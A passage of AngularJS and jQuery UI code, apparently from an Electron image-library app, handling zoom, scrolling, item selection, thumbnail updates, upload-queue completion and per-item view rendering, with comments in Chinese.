                containerWidth = $(window).width();
                containerHeight = $container.height() - toolbarHeight;
            }
            else {
                toolbarHeight = 48;
                containerWidth = $container.width();
                containerHeight = $container.height() - toolbarHeight;
            }

            var a = parseInt((containerHeight) / current.height * 100);
            var b = parseInt((containerWidth) / current.width * 100);
            ratio = Math.min(a, b);
            offsetY = toolbarHeight/2 * 100 / ratio;
            
            if (!current) return;

            $("#detail-image").css({
                "transform": `rotate(0deg)`,
                "transition": "none"
            });

            var $detailContainer = $("#detail-container");
            var width = $detailContainer.width();
            var height = current && current.height || $detailContainer.height();

            offsetY = offsetY || 0;

            if (ratio) {
                $scope.imageSize.zoomRatio = $scope.getRatioNonExp(ratio);
                $scope.imageSize.zoomRatioExp = ratio;
                $scope.zoomFitSize = ratio;
            }
            $scope.showLargeImage = true;
            $detailContainer.smoothZoom('focusTo', {
                x: width / 2,
                y: height / 2 + offsetY,
                zoom: parseInt(ratio),
                speed: 0
            });
        };

        $scope.updateContainerHieght = function (hasAnimation, delay = 1) {
            let duration = 170;
            if (!hasAnimation) duration = 1;
            setTimeout(() => {
                if (eagle.filter.isOpen) {
                    var $filterBar = $("#filter-toolbar");
                    var height = $filterBar.outerHeight();
                    $("#box-container").css({
                        "padding-bottom": height,
                        "height": `calc(100% - ${48 + height}px)`
                    });
                    $("#box-container-scrollbar").css({
                        "top": 48 + height,
                    });
                    $("#box-container").css({
                        "margin-top": height,
                    });
                }
                else {
                    $("#box-container").css({
                        "padding-bottom": 0,
                        "height": `calc(100% - 48px)`
                    });
                    $("#box-container-scrollbar").css({
                        "top": 48,
                    });
                    $("#box-container").css({
                        "margin-top": 0,
                    });
                }
            }, delay);
        };

        $scope.scrollToCurrentItem = function () {
            if ($scope.selected.length > 0) {
                var $lastItem = $(".box.selected").last();
                if ($lastItem.length > 0) {
                    let y = $lastItem.attr("posy");
                    if (y !== undefined) {
                        let offsetTop = $("#box-container").height() / 2 - $lastItem.height() / 2;
                        $("#box-container").scrollTop(parseInt(y) - offsetTop);
                    }
                }
            }
        };

        $scope.offsetScrollbarImm = function (delay, forceScroll) {
        	var $container = $("#box-container");
            setTimeout(function() {
                if ($scope.selected.length > 0) {
                    var $current = $(".box.selected").last();
                    var offsetTop = $container.height() / 2 - $current.height() / 2;
                    $container.scrollTo($current, 20, {
                        axis: 'y',
                        duration: 0,
                        offset: {
                            top: -offsetTop,
                        }
                    });
                }
                else {
                    // Note: 這段程式馬主要用來避免因為列表縮放，
                    // Container 的 scrollTop 超過最後一個 box 的位置，造成畫面變成空白的
                    // 判斷方式：找到最後一個 box 並與 container 進行高度比較
                    var $lastBox = $(".box:last");
                    if ($lastBox[0]) {
                        var lastBoxY = $lastBox[0].style.transform.split(',')[1];
                        lastBoxY = parseInt(lastBoxY);
                        if ($container.scrollTop() > lastBoxY) {
                            $container.scrollTo($lastBox, 20, {
                                axis: 'y',
                                duration: 30,
                                offset: {
                                    top: -$container.height(),
                                }
                            });
                        }
                    }
                }
            }, delay || 1);
            $scope.updateContainerHieght();
        };

        $scope.offsetScrollbar = _.debounce(function offsetScrollbar (delay, forceScroll) {
            $scope.offsetScrollbarImm(delay, forceScroll);
        }, 100, true);

        $scope.playGif = function(image) {
            image.playing = true;
        };

        $scope.pauseGif = function(image) {
            image.playing = false;
        };

        $scope.$watch("eagle.filter.filterRules.file.min", function(newValue) { $scope.filterContent(); });
        $scope.$watch("eagle.filter.filterRules.file.max", function(newValue) { $scope.filterContent(); });
        $scope.$watch("eagle.filter.filterRules.duration.min", function(newValue) { $scope.filterContent(); });
        $scope.$watch("eagle.filter.filterRules.duration.max", function(newValue) { $scope.filterContent(); });
        $scope.$watch("eagle.filter.filterRules.bpm.min", function(newValue) { $scope.filterContent(); });
        $scope.$watch("eagle.filter.filterRules.bpm.max", function(newValue) { $scope.filterContent(); });
        $scope.$watch("eagle.filter.filterRules.shape.width", function(newValue) { 
            if (eagle.filter.filterRules.shape.width && eagle.filter.filterRules.shape.height) {
                $scope.filterContent(); 
            }
        });
        $scope.$watch("eagle.filter.filterRules.shape.height", function(newValue) { 
            if (eagle.filter.filterRules.shape.width && eagle.filter.filterRules.shape.height) {
                $scope.filterContent(); 
            }
        });
        $scope.$watch("eagle.filter.filterRules.resolution.minW", function(newValue) { $scope.filterContent(); });
        $scope.$watch("eagle.filter.filterRules.resolution.maxW", function(newValue) { $scope.filterContent(); });
        $scope.$watch("eagle.filter.filterRules.resolution.minH", function(newValue) { $scope.filterContent(); });
        $scope.$watch("eagle.filter.filterRules.resolution.maxH", function(newValue) { $scope.filterContent(); });
        $scope.$watch("imageSize.height", function(newValue) {
            $scope.updateSubFolderWidth();
            $scope.updateListSlider(newValue);
            if ($scope.imageSize.height > 440) {
            	enlargeThumbnails();
            }
            else {
            	shrinkThumbnails();
            }
        });
        $scope.$watch("imageSize.zoomRatio", function(newValue) {
            $scope.sliderZoomRatio = newValue;
        });

        $scope.$watchCollection("selected", function(newValue, oldValue) {

            $scope.selectedMappings = {};
            $scope.zoomFitSize = 0;

            $scope.selected.forEach(function(image, index) {
                if (image) {
                    $scope.selectedMappings[image.id] = true;
                }
            });

            if ($scope.selected.length > 0) {
                $scope.updateSelection();
            }

            if ($scope.isDetailMode) {
                $scope.showLargeImage = false;
                $scope.rememberVideoCurrentTime(oldValue[0]);
                AnnotationPreview.hide();
                $("#detail-image").data("degree", 0);
            	$("#detail-image").css({
	                "transform": ``
	            });
				setTimeout(() => {
					$("#detail-container").smoothZoom('updateNavigator', $bodyScope.current);
				}, 300);
            }

            if ($scope.selected.length === 1) {
                $scope.lastSelectedIndex = $scope.currentIndex() - 1;
            }

            // 全选
            if ($scope.selected.length === $scope.allData.length) {
                $scope.lastSelectedIndex = $scope.selected.length - 1;
                $(".box").addClass("selected");
            }
            else {
                $scope.selectItemsView($scope.selected);
            }

            var lastItem = $scope.selected[0];
        	if (lastItem) {
        		setLastItem(lastItem);
            }
        });

        if (process.platform == 'darwin') {
            $scope.$watchCollection("selected", debounce(function() {
                // 如果当前是预览视窗开启状态，切换内容时要自动在开启预览视窗
                if ($scope.selected.length === 1 && $scope.isPreviewing) {
                    ipcRenderer.send('quicklook', $scope.selected[0]);
                }
            }, 300, true));
        }

        ipcRenderer.on('webp.converted', function(e, converted) {
            // 更新封面
            if (converted && $scope.itemMappings[converted.id]) {
                updateItemListView(converted);
            }
            $scope.$evalAsync();
        });

        ipcRenderer.on('thumbnail-generated', function(e, generated) {
            console.log("thumbnail-generated")
            if (generated && generated.id) {
                let existItem = $scope.itemMappings[generated.id];
                if (existItem) {
                    // 更新封面
                    updateItemListView(generated);
                }
                else {
                    ipcRenderer.send("file-uploaded-end", generated);
                }
                $scope.$evalAsync();
            }
        });

        function updateItemListView (generated) {
            if (generated && $scope.itemMappings[generated.id]) {
                // 取得需要更新的图片
                var $img = $("#box-" + generated.id + " img");
                var image = $scope.itemMappings[generated.id];
                var originWidth = image.width;
                var originHeight = image.height;
                var originOrientation = image.orientation;

                if (!image) return;

                if ($scope.itemMappings[generated.id]) {
                    if (!$scope.modifiedMappings[generated.id]) {
                        $scope.modifiedMappings[generated.id] = 1;
                    }
                    else {
                        $scope.modifiedMappings[generated.id]++;
                    }

                    $scope.updateFilterCounts(image, -1, Date.now());
                    $scope.updateFilterCounts(generated, 1, Date.now());

                    image.width = generated.width;
                    image.height = generated.height;
                    image.size = generated.size;
                    image.ext = generated.ext;

                    if (generated.fontMetas) {
                        image.fontMetas = generated.fontMetas;
                    }
                    
                    if ("png jpg".indexOf(generated.ext) === -1) {
                        $("#box-" + image.id + " .type-label").text(generated.ext.toUpperCase());
                    }
                    else {
                        $("#box-" + image.id + " .type-label").text("");
                    }
                    $("#box-" + image.id + " .name").attr("data-ext", `.${generated.ext}`);

                    if (generated.text && generated.text !== image.text) {
                        image.text = generated.text;
                        var paragraphs = image.text.split("\n");
						var paragraphsHTML = "";
						paragraphsHTML += `<h4>${image.name.trim()}</h4>`;
						paragraphs.forEach(function (paragraph) {
							paragraphsHTML += `<p>${paragraph.trim()}</p>`;
						});
                        $("#box-" + image.id + " .txt-content div").html(paragraphsHTML);
                    }

                    if (generated.mtime) {
                        image.mtime = generated.mtime;
                    }

                    if (generated.btime) {
                        image.btime = generated.btime;
                    }

                    if (generated.animated) {
                        image.animated = generated.animated;
                    }

                    if (generated.orientation) {
                        image.orientation = generated.orientation;
                    }

					if (generated.resolutionWidth) {
                        image.resolutionWidth = generated.resolutionWidth;
                    }

					if (generated.resolutionHeight) {
                        image.resolutionHeight = generated.resolutionHeight;
                    }

                    if (image.orientation && !generated.orientation) {
                        delete image.orientation;
                    }

                    let refreshThumb = false;
                    if (image.noPreview !== generated.noPreview) {
                        image.noPreview = generated.noPreview;
                        if (image.noPreview) {
                            $scope.rebindRefresh();
                        }
                    }

                    if (image.customThumbnail !== generated.customThumbnail) {
                        image.customThumbnail = generated.customThumbnail;
                        refreshThumb = true;
                    }

                    if (generated.noThumbnail) {
                        image.noThumbnail = generated.noThumbnail;
                    }
                    else {
                        if (image.noThumbnail) {
                            delete image.noThumbnail;
                            delete image.disable;
                            refreshThumb = true;
                        }
                    }

                    if (generated.palettes) {
                        image.palettes = generated.palettes;
                        image.processingPalette = generated.processingPalette
                    }
                    
                    // 如果尺寸发生改变，才需要重新更新画面排版
                    const aspectRatio = `${image.width} / ${image.height}`;
                    const currentAspectRatio = $("#box-" + image.id).find(".thumbnail").css("aspect-ratio");
                    if (
                        (originHeight !== generated.height && originWidth !== generated.width) || 
                        originOrientation !== generated.orientation || 
                        aspectRatio !== currentAspectRatio
                    ) {
                        $scope.updateItemView(image);
                        $scope.relayout();
                        $scope.offsetScrollbar(30);
                        refreshThumb = true;
                    }

                    if (generated.duration !== image.duration) {
                        image.duration = generated.duration;
                        $scope.updateItemView(image);
                    }

                    if (generated.bpm !== image.bpm) {
                        image.bpm = generated.bpm;
                        $scope.updateItemView(image);
                    }

                    if (refreshThumb && !image.noPreview) {
                        var $element = $("#box-" + image.id);
                        $element.find("img").attr("src", FileUrlHelper.getThumbnailUrl(image) + "&v=" + Date.now());
                        $element.find(".thumbnail").css("aspect-ratio", `${image.width} / ${image.height}`);
                    }
                }
                if ($img && $img.length > 0 && !image.noPreview) {
                    $img.parent().removeClass("dummy").prop("title", "");
                    var src = $img.attr("src") || $img.attr('lazysrc');
                    var newSrc;
                    if (src) {
                        if (generated.ext === 'svg') {
                            newSrc = FileUrlHelper.getThumbnailUrl(generated) + "?v=" + Date.now();
                            $img.attr("src", newSrc);
                            $img.attr("lazysrc", newSrc);
                        }
                        else if (generated.noThumbnail) {
                            newSrc = FileUrlHelper.getThumbnailUrl(generated) + "?v=" + Date.now();
                            $img.attr("src", newSrc);
                            $img.attr("lazysrc", newSrc);
                        }
                        else {
                            newSrc = FileUrlHelper.getThumbnailUrl(generated);
                            if (newSrc.indexOf("?v") > -1) {
                                $img.attr("src", newSrc + "&v=" + Date.now());
                                $img.attr("lazysrc", newSrc + "&v=" + Date.now());
                            }
                            else {
                                $img.attr("src", newSrc + "?v=" + Date.now());
                                $img.attr("lazysrc", newSrc + "?v=" + Date.now());
                            }
                        }
                    }
                }
            }
            $scope.finishGenerateQueue.push(generated);
            $scope.rememberVideoCurrentTime($scope.current);

            if ($scope.isDetailMode) {
                if (generated && $scope.selected && $scope.selected[0] && generated.id === $scope.selected[0].id) {
					if (VIDEO_TYPES[$scope.current.ext] || AUDIO_TYPES[$scope.current.ext]) {
                    	
                    }
                    else {
                        $("#detail-container").smoothZoom('updateNavigator', $scope.current);
                    }
                }
            }
        }
        $scope.updateItemListView = updateItemListView;

        $scope.updateTxtItem = function (item) {
            var paragraphs = item.text.split("\n");
			var paragraphsHTML = "";
			paragraphsHTML += `<h4>${item.name.trim()}</h4>`;
			paragraphs.forEach(function (paragraph) {
				paragraphsHTML += `<p>${paragraph.trim()}</p>`;
			});
            $("#box-" + item.id + " .txt-content div").html(paragraphsHTML);
            if ($scope.selected.length === 0 && $scope.selected[0] === item) {
            	$(".inspector .txt-content div").html(paragraphsHTML);
            }
        }

        $scope.cancelRegenerateThumbnail = () => {
            IPCHelper.send('cancel.generate.thumbnail');
            $scope.regenerateThumbnailQueue = [];
        };

        $scope.$watchCollection("finishGenerateQueue", function() {
            if ($scope.finishGenerateQueue.length >= $scope.regenerateThumbnailQueue.length) {
                $timeout(function() {
                    $scope.finishGenerateQueue = [];
                    $scope.regenerateThumbnailQueue = [];
                    $scope.findDupclipate(undefined);
                }, 200);
            }
        });

        $scope.$watchCollection("finishQueue", function(newValue, oldValue) {

            if (newValue === oldValue) return;

            if (!$scope.raw || $scope.raw.length === 0 ) { 
                if ($scope.finishQueue.length > 0 && $scope.finishQueue.length ===  $scope.uploadQueue.length) {
                    $scope.finishQueue = [];
                    $scope.uploadQueue = [];
                    $scope.hideUploadQueue();
                }
                return; 
            }

            if ($scope.finishQueue.length >0 && $scope.finishQueue.length >= $scope.uploadQueue.length) {

                // 清除倒数计时工具
                $scope.addImageStartTime = undefined;
                clearInterval(addImageTimeLeftInterval);

                var total = $scope.uploadQueue.length;
                // 以队列最后一张图判断，是否要刷新使用者当前查看的列表
                var lastImage = $scope.finishQueue[$scope.finishQueue.length - 1];

                // 自动选择新增的图片
                var newItems = [];
                $scope.finishQueue.forEach(function (image) {
                    if (image && image.id) {
                        newItems.push(image);
                    }
                });

                $scope.finishQueue = [];
                $scope.uploadQueue = [];
                $("#upload-queue-progress").find(".message .percentage").html($scope.finishQueue.length + "/" + $scope.uploadQueue.length);
                $("#upload-queue-progress").find(".current").width($scope.finishQueue.length/$scope.uploadQueue.length*100 + "%");
                $scope.hideUploadQueue();

                // 判斷是否有重複的圖片
                if ($rootScope.preferences.notification.notification.when.repeatImage != 'false') {
                    if ($scope.duplicateQueue.length > 0) {
                        $rootScope.$broadcast("OPEN_DUPLICATE", {
                            currentFolder: $scope.currentFolder,
                            mappings: $scope.duplicateMappings,
                            duplicates: $scope.duplicateQueue
                        });
                        if ($rootScope.preferences.notification.soundEffect.enable != 'false') {
                            $scope.duplicateSound.play();
                        }
                        $scope.duplicateQueue = [];
                    }
                }
                // 如果沒有啟動重複通知，一律圖片直接添加上來
                else {
                    $scope.duplicateQueue.forEach(function(img) {
                        $scope.addToDuplicateMapping(img);
                        if ($scope.raw) { $scope.raw.unshift(img); }
                    });
                    $scope.duplicateQueue = [];
                }

                function autoSelectUploadedItems () {

                	if ($scope.isDetailMode) return;

                    if ($rootScope.preferences.general.autoSelect !== 'true') {
                        if (newItems.length === 1) {
                            $timeout(function () {
                                $scope.scrollToSelectedItem();
                            }, 120);
                        }
                        return;
                    }

                    // 避免几百几千个？
                    if ($scope.viewMode !== 'random') {
                        var MAX_AUTO_SELECT = 1000;
                        if (newItems && newItems.length <= MAX_AUTO_SELECT) {
                            $scope.selected = newItems;
                            var targetSelectedIndex = $scope.allData.indexOf($scope.selected[0]);
                            $scope.lastSelectedIndex = targetSelectedIndex;
                            $rootScope.currentFocus = "content";
                            if (newItems.length === 1) {
                                $timeout(function () {
                                    $scope.scrollToSelectedItem();
                                }, 120);
                            }
                        }
                    }
                }

                $scope.calculateImageBinding({}, function() {

                    // NOTE: 图片添加完成后，如果添加的图片不是使用者正在查看的文件夹，不需要刷新画面
                    // 哪些情况下不该自动选择
                    // 1. 大量文件
                    // 2. 用户正在观赏查看图片，不想被打扰
                    // 例如：用户打开 A 文件夹查看中，此实在其它应用（浏览器）收藏图片
                    if ($scope.currentFolder) {
                        try {
                            // var lastImage = $scope.raw[0];
                            if (!lastImage || !lastImage.folders) {
                                $scope.reload(true);
                                autoSelectUploadedItems();
                                return;
                            }
                            var needReload = isInFolder(lastImage, $scope.currentFolder);
                            if (needReload) {
                                $scope.startCursor = 0;
                                $scope.reload(true);
                                autoSelectUploadedItems();
                            }
                        }
                        catch (err) {
                            $scope.reload(true);
                            autoSelectUploadedItems();
                            electronLog && electronLog.error(err.stack || err);
                        }
                    }
                    else if ($scope.currentSmartFolder) {
                    	$scope.reload(true);
                    }
                    // 如果来自全部图片、未归类、未分类，一律进行刷新
                    else if ($scope.viewMode == "all" || $scope.viewMode == "unfiled" || $scope.viewMode == "untagged") {
                        $scope.startCursor = 0;
                        $scope.reload(true);
                        autoSelectUploadedItems();
                    }
                    else {
                        // electronLog && electronLog.error("特殊状况，列表没有正常刷新");
                    }
                });

                try {
                    if ($scope.finishQueue.length > 2) {
                        if (process.platform == 'darwin') {
                            window.setTimeout(function() { remote.app.dock.bounce("critical") }, 1000);
                        } else {
                            window.setTimeout(function() {
                                if (!document.hasFocus()) {
                                    currentWindow.flashFrame(true);
                                }
                            }, 1000);
                        }
                    }
                }
                catch (err) {
                    electronLog && electronLog.error(err.stack || err);
                }

                // 讓 Palette Queue 繼續
                IPCHelper.send('palette-resume', undefined, true);
                console.log("添加 %s 張圖片完成", total);
                console.timeEnd("添加圖片耗費時間");
            }
        }, true);

        $scope.updateSelection = function() {
            $scope.$broadcast("UPDATE_INSPECTOR");
        };

        $scope.selectFolder = function(event, folder) {
            document.activeElement.blur();
            if (folder) {
                $scope.selectedFolderMappings = {};
                $scope.selectedMappings = {};
                $scope.selectedFolderMappings[folder.id] = true;
                $rootScope.currentFocus = "content";
                $scope.selected = [];
                $scope.updateSelection();
            }
        };

        $scope.select = function(event, image) {

        	if (event && event.button >= 3) {
        		return;
        	}

        	if (event) event.stopPropagation();

            // 中键点击
            if (event && event.button === 1) {
                if ($rootScope.preferences.habits.middleBtn === "openNewWindow") {
                    event && event.preventDefault();
                    if (!AUDIO_TYPES[image.ext]) {
						openInNewWindow([image]);
                        RecentFileManager.addFile(image);
	                    analytics.event('NewWindow', 'Open', image.ext);
                    }
                }
				else if ($rootScope.preferences.habits.middleBtn === "openPluginPanel") {
					event && event.preventDefault();
					$scope.openPluginPanel();
				}
                return;
            }

            if (HoverPreview.isShow) {
                HoverPreview.hide();
                HoverPreviewKeydown = false;
                HoverPreview.lastElem = undefined;
            }

            if ($rootScope.currentFocus !== "content" && $scope.selected.length > 1) {
            	if (image && $scope.selectedMappings[image.id]) {
            		return;
            	}
            }

            $rootScope.currentFocus = "content";
            $scope.selectedFolderMappings = {};

            $("input:focus").blur();
            $("[contenteditable]:focus").blur();

            $timeout.cancel(cleanSelectedTimeout);

            if ($scope.isPreviewing) {
                $scope.isPreviewing = false;
                currentWindow.closeFilePreview();
            }
            window.getSelection().removeAllRanges();

            if (!image) {
                return;
            }

            // 如果點擊的內容已經選取
            if (image && $scope.selectedMappings[image.id]) {
                // 如果點擊這些按鍵，就許消選取
                if (event) {

                    // Note: macOS control + 点击等同右键
                    let cancelSelect = false;
                    if (process.platform === 'darwin') {
                        cancelSelect = event.metaKey || event.shiftKey;
                    }
                    else {
                        cancelSelect = event.shiftKey || event.ctrlKey;
                    }

                    if (cancelSelect) {
                    	if (event.button !== 2) {
	                        var idx = $scope.selected.indexOf(image);
	                        $scope.selected.splice(idx, 1);
	                        delete $scope.selectedMappings[image.id];
                        }
                    }
                }
                return;
            }

            var targetSelectedIndex = $scope.allData.indexOf(image);

            if (event && !event.metaKey && !event.shiftKey && !event.ctrlKey) {
                $scope.selected = [];
                $scope.lastSelectedIndex = targetSelectedIndex;
            }
            if (event && (event.metaKey || event.ctrlKey) ) {
                $scope.lastSelectedIndex = targetSelectedIndex;
            }
            if (event && event.shiftKey) {
                $scope.selected.push(image);
                $scope.selectedMappings[image.id] = true;
                var selection = $scope.getSelection();

                var start = selection.start;
                var end = selection.end;

                if ($scope.lastSelectedIndex >= 0) {
                    start = $scope.lastSelectedIndex;
                }

                if (targetSelectedIndex >= 0) {
                    end = targetSelectedIndex;
                }

                if (start > end) {
                    [start, end] = [end, start];
                }

                var invert = selection.invert;
                if (!invert) {
                    for (var i = start; i <= end; i++) {
                        if ($scope.allData[i]) {
                            var alidx = $scope.selected.indexOf($scope.allData[i]);
                            if (alidx !== -1) {
                                $scope.selected.splice(alidx, 1);
                            }
                            $scope.selected.push($scope.allData[i]);
                            $scope.selectedMappings[$scope.allData[i].id] = true;
                        }
                    }
                }
                else {
                    for (var i = end; i >= start; i--) {
                        if ($scope.allData[i]) {
                            var alidx = $scope.selected.indexOf($scope.allData[i]);
                            if (alidx !== -1) {
                                $scope.selected.splice(alidx, 1);
                            }
                            $scope.selected.push($scope.allData[i]);
                            $scope.selectedMappings[$scope.allData[i].id] = true;
                        }
                    }
                }
            } else if (!$scope.selectedMappings[image.id]) {
                if (image && $scope.selected.indexOf(image) === -1) {
                    $scope.selected.push(image);
                    $scope.selectedMappings[image.id] = true;
                }
            }
            $scope.selected = [...new Set($scope.selected)];
        };

        $scope.onBoxMouseup = function(event, image) {
            if (event && event.button === 0) {

            	// 如果從 sidebar focus 狀態點擊列表已選擇圖片，不該造成已選擇圖片選取狀態消失
            	if ($rootScope.currentFocus !== "content" && $scope.selected.length > 1) {
            		if (image && $scope.selectedMappings[image.id]) {
		            	$rootScope.currentFocus = "content";
		            	return;
		            }
	            }
                if (image && $scope.selectedMappings[image.id]) {
                    // 如果點擊這些按鍵，就許消選取
                    if (event) {
                        if (event.metaKey || event.shiftKey || event.ctrlKey) {}
                        // 符合系统操作逻辑
                        else {
                            var targetSelectedIndex = $scope.allData.indexOf(image);
                            $scope.selected = [image];
                            $scope.lastSelectedIndex = targetSelectedIndex;
                        }
                    }
                    return;
                }
            }
        }

        $scope.updateItemView = function (item) {

            if (!item) return;
            try {
                var id = item.id;
                var $element = $("#box-" + id);
                if ($element.length === 0) return;
                var $name = $element.find(".name span");
                var $iconName = $element.find(".ext-icon-name");
                var $metas = $element.find(".metas");
                var thumbnail = $element.find(".thumbnail");
                var $propTags = $element.find(".prop.tags");
                var $propResolution = $element.find(".prop.resolution");
                var $propRating = $element.find(".prop.rating");
                var $propSize = $element.find(".prop.size");
                var isSelected = $scope.selectedMappings[id];
                var tags = item.tags || [];
                var isTagged = tags.length > 0;
                var $annotationCount = $element.find(".annotation-count");
                var ratingStrings = {
                "undefined": "★★★★★",
                "0": "★★★★★",
                "1": "<y>★</y>★★★★",
                "2": "<y>★★</y>★★★",
                "3": "<y>★★★</y>★★",
                "4": "<y>★★★★</y>★",
                "5": "<y>★★★★★</y>",
            };
                var tagsFormated = "-";
                if (item.tags && item.tags.length) {
                    var tags = item.tags.map(function (tag) {
                        try {
                            return `<div class="tag color-${$bodyScope.TagManager.tagMappings[tag].color}">${tag}</div>`;
                        } catch (err) {}
                    });
                    tagsFormated = tags.join("");
                }

                $element.attr("data-height", item.height);
                $element.attr("data-width", item.width);

                if ($name.text() !== item.name) {
                    if (!$scope.modifiedMappings[item.id]) $scope.modifiedMappings[item.id] = 0;
                    $scope.modifiedMappings[item.id]++;
                    let src = FileUrlHelper.getLastestThumbnailUrl(item);
                    var $img = $element.find(".thumbnail img");
                    $img.attr("lazysrc", "");
                    $img.attr("lsrc", src);
                    $img.attr("raw", src);
                    // 確保不是在編輯模式
                    if (!$name.parent().hasClass('editable')) {
                        $name.text(item.name);
                        $iconName.text(item.name);
                    }
                }

                if (item.comments && item.comments.length > 0) {
                    $element.addClass("has-annotation");
                    $annotationCount.text(item.comments.length);
                }
                else {
                    $element.removeClass("has-annotation");
                }

                $element.removeClass("bg-light bg-dark bg-gray bg-grid");
                if (item.background) {
                    $element.addClass(`bg-${item.background}`);
                }

                var metas = '';
                switch ($bodyScope.listMetaType) {
                    case 'RESOLUTION':
                    	if (item.duration && VIDEO_TYPES[item.ext]) {
                            metas = $filter('duration')(item.duration);
                        }
                        else if (item.duration && AUDIO_TYPES[item.ext]) {
                            metas = $filter('duration')(item.duration);
                        }
                        else if (item.fontMetas && FONT_TYPES[item.ext]) {
                            metas = item.fontMetas.weight;
                        }
                        else if (item.noPreview) {
                            metas = `${fileSize(item.size, 1)}`;
                        }
                        else if (SPECIAL_TYPES[item.ext]) {
                            metas = `${fileSize(item.size, 1)}`;
                        }
                        else if (item.ext === "url") {
							if (item.duration) {
								metas = $filter('duration')(item.duration);
							}
							else {
								metas = $filter('domainName')(item.url);
							}
						}
                        else {
                            metas = item.width + " x " + item.height;
                        }
                        if (item.ext === "txt") {
                            var paragraphs = item.text.split("\n");
                            var paragraphsHTML = "";
                            paragraphsHTML += `<h4>${item.name.trim()}</h4>`;
                            paragraphs.forEach(function (paragraph) {
                                paragraphsHTML += `<p>${paragraph.trim()}</p>`;
                            });
                            $("#box-" + item.id + " .txt-content div").html(paragraphsHTML);
                        }
                        break;
                    case 'FILESIZE':
                        metas = `${fileSize(item.size, 1)}`;
                        break;
                    case 'TYPE':
                        metas = item.ext && item.ext.toUpperCase();
                        break;
                    case 'MTIME':
						var mtime = item.mtime || item.modificationTime;
						metas = $filter("date")(item.mtime || item.modificationTime, "yyyy/MM/dd HH:mm");
						break;
					case 'BTIME':
						var btime = item.btime || item.modificationTime;
						metas = $filter("date")(item.btime || item.modificationTime, "yyyy/MM/dd HH:mm");
						break;
                    case 'TAGS':
                        metas = tagsFormated;
                        break;
                    case 'RATING':
                        metas = `<span class="small star">${ratingStrings[item.star]}</span>`;
                        break;
                }
                $metas.html(metas);

                $propTags.html(tagsFormated);
                if (item.width) {
                    $propResolution.html(`${item.width} x ${item.height}`);
                }
                else {
                    $propResolution.html(`-`);
                }
                $propRating.html(`<span class="small star">${ratingStrings[item.star]}</span>`);
                $propSize.html(`${fileSize(item.size, 1)}`);

                if (isSelected) {
                    $element.addClass("selected");
                }
                else {
                    $element.removeClass("selected");
                }

                if (isTagged) {
                    $element.addClass("tagged");
                }
                else {
                    $element.removeClass("tagged");
                }

                $element.find("img").removeClass("r2 r3 r4 r5 r6 r7 r8");
                if (item.orientation && !item.noThumbnail) {
                    if (item.orientation === 8) {
                        $element.find("img").addClass(" r8 ");
                    }
                    else if (item.orientation === 7) {
                        $element.find("img").addClass(" r7 ");
                    }
                    else if (item.orientation === 6) {
                        $element.find("img").addClass(" r6 ");
                    }
                    else if (item.orientation === 5) {
                        $element.find("img").addClass(" r5 ");
                    }
                    else if (item.orientation === 4) {
                        $element.find("img").addClass(" r4 ");
                    }
                    else if (item.orientation === 3) {
                        $element.find("img").addClass(" r3 ");
                    }
                    else if (item.orientation === 2) {
                        $element.find("img").addClass(" r2 ");
                    }

                    if (item.orientation > 4) {
                        if (item.width < item.height) {
                            $element.find("img").css("min-width", `${item.height / item.width * 100}%`);
                        }
                        else {
                            $element.find("img").css("width", `${item.height / item.width * 100}%`);
                        }
                    }
                }

                if (item.fontMetas && item.fontMetas.postScriptName) {
                    var key = Object.keys(item.fontMetas.postScriptName)[0];
                    var postScriptName = item.fontMetas.postScriptName && item.fontMetas.postScriptName[key];
                    var fontPath = `${fontFolder}/${sanitize(postScriptName)}.${item.ext}`;
                    var activatedLabel = i18n.__("Context.Image.Font.Activate");
                    var deactivatedLabel = i18n.__("Context.Image.Font.Deactivate");
                    // 添加正在启用、正在停用状态
                    if (item.activating || item.deactivating) {
                        $element.addClass("activating");
                    }
                    else if (fs.existsSync(fontPath)) {
                        installedFonts[`${postScriptName}_.${item.ext}`] = true;
                        $element.removeClass("activating");
                        $element.addClass("activated");
                        $element.find(".activate-btn").attr("title", deactivatedLabel);
                    }
                    else {
                        installedFonts[`${postScriptName}_.${item.ext}`] = false;
                        $element.removeClass("activating");
                        $element.removeClass("activated");
                        $element.find(".activate-btn").attr("title", activatedLabel);
                    }
                }
            }
            catch (err) {
                console.error(err);
            }
        };

        $scope.updateItemsView = function (items) {
            $(".box.selected").removeClass("selected");
            for (var i = items.length - 1; i >= 0; i--) {
                var item = items[i];
                $scope.updateItemView(item);
            }
        };

        $scope.selectItemsView = function (items) {
            var $boxContainer = $boxContainer || $("#box-container");
            $boxContainer.find(".box.selected").removeClass("selected");
            items.forEach(function (item) {
            	if ($scope.selectedMappings[item.id]) {
            		$("#box-" + item.id).addClass("selected");
            	}
            	else {
            		$("#box-" + item.id).removeClass("selected");
            	}
            });
        };

        function autoScroll(index) {
            $timeout(function() {
                $scope.$broadcast("AutoScroll", index);
            }, 50);
        };

        $scope.autoScroll = autoScroll;

        function getArroundBox(index) {
            var arroundStart = (index - 20 >= 0) ? index - 20 : 0;
            var arroundEnd = (index + 20 > $scope.allData.length) ? $scope.allData.length : index + 20;
            var $arround = $(".box").slice(arroundStart, arroundEnd);
            return $arround;
        };

        $scope.keyCHandler = function (event) {
            if ($scope.isInlineMode) return;
            if ($scope.isDetailMode) {
                $scope.toggleCommentMode(event);
            }
        };

        $scope.keyPHandler = function (event) {
            $scope.openPluginPanel(event);
        };

        $scope.keyLeftHandler = function(event) {
            event && event.preventDefault();
            if ($(".swal2-container").length > 0) return;
            if ($rootScope.currentFocus == "content") {
                $scope.selectPrev(event);
            }
            else if ($rootScope.currentFocus == "tags") {
                $rootScope.currentFocus = "sidebar";
            }
            else {
                if ($rootScope.selectedFolders.length > 1) {
                    $rootScope.selectedFolders.forEach(function (folder) {
                        if (folder.children && folder.children.length > 0) {
                            if (folder.isExpand !== false) {
                                folder.isExpand = false;
                                localStorage.setItem("eagle.sidebar.folder.expand." + folder.id, false);
                            }
                        }
                    });
                    $scope.updateSidebarList();
                }
                else if ($scope.currentFolder) {
                    if (!$scope.currentFolder.children || $scope.currentFolder.children.length ==0) {
                        $scope.currentFolder.isExpand = true;
                        $scope.updateSidebarList();
                    }
                    else {
                        $scope.currentFolder.isExpand = false;
                        $scope.updateSidebarList();
                    }
                    localStorage.setItem("eagle.sidebar.folder.expand." + $scope.currentFolder.id, false);
                }
                else if ($scope.currentSmartFolder) {
                    if (!$scope.currentSmartFolder.children || $scope.currentSmartFolder.children.length ==0) {
                        $scope.currentSmartFolder.isExpand = true;
                        $scope.updateSidebarList();
                    }
                    else {
                        $scope.currentSmartFolder.isExpand = false;
